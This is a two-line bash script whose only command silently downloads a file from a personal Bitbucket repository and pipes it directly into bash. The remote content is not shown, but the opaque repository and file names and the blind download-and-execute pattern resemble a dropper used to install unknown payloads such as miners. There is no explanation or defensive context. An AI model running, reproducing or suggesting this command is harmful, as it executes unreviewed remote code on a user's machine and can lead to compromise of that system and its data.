#!/bin/bash

curl -sL  https://bitbucket.org/kotamabaran777/gas1/raw/93343509681cc2f5f11beaf8ebf614523fc36640/Oke55 | bash